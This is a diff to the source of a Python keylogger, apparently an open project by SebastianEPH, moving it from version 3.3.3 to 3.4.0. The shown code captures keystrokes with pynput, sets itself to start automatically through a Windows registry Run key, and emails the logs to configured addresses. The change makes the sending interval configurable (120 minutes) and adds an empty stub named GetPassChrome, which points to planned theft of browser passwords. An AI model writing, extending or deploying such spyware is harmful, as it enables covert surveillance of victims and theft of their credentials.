@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.3.3
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.4.0
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -286,10 +286,7 @@ def SendLog():
     while (True):
         n = n+1
 
-        # Enviar cada 2 horas aprox
-        for x in range(1):    #720
-            time.sleep(10) # *10 
-            #print("Pasó: "+ str(x*10))
+        time.sleep(timeSend()*60) 
 
         if VerificarConexion(): # Continua solo si hay conexión
             # Crea nombre del archivo
@@ -330,7 +327,10 @@ def addStartup():  # function =  Iniciar automaticamente
         if (verificar()):
             registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
             SetValueEx(registry,name, 0, REG_SZ, path)
-    # Personalizar Keylogger
+def GetPassChrome():
+    pass
+
+
 
 # ************************************************   ZONA CUSTOM   *********************************
 def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
@@ -355,6 +355,9 @@ def emailS():                   # <<== Cambia éste correo
 def passS():                   # <<== Contraseña del correo 
     return "pass2"
 
+def timeSend():                 # Tiempo de Envío erzonalizado
+    return 120                  # tiempo en minutos
+
 #Correos que recibirán los archivos log
 def ReceiveE():
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
@@ -375,7 +378,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v.3.3.3     #
+#                                                   v.3.4.0     #
 #################################################################
 # NOTAS IMPORTANTES:
 #
